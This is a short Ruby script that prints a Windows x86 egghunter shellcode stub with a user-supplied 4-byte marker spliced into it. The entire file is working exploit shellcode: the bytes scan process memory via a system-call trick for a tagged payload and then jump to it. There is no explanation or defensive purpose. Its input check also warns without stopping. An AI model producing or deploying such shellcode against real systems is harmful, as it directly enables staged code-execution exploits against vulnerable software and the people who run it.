#!/usr/bin/ruby
if ARGV.size != 1 || ARGV[0].size !=4
  puts "Need to give me a 4 byte value"
end

#egg = ARGV[0].gsub(/./).map {|c| c.ord.to_s.hex.chr}.join
egg = ARGV[0]
puts egg

shell_code = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
shell_code += egg
shell_code += "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

puts shell_code

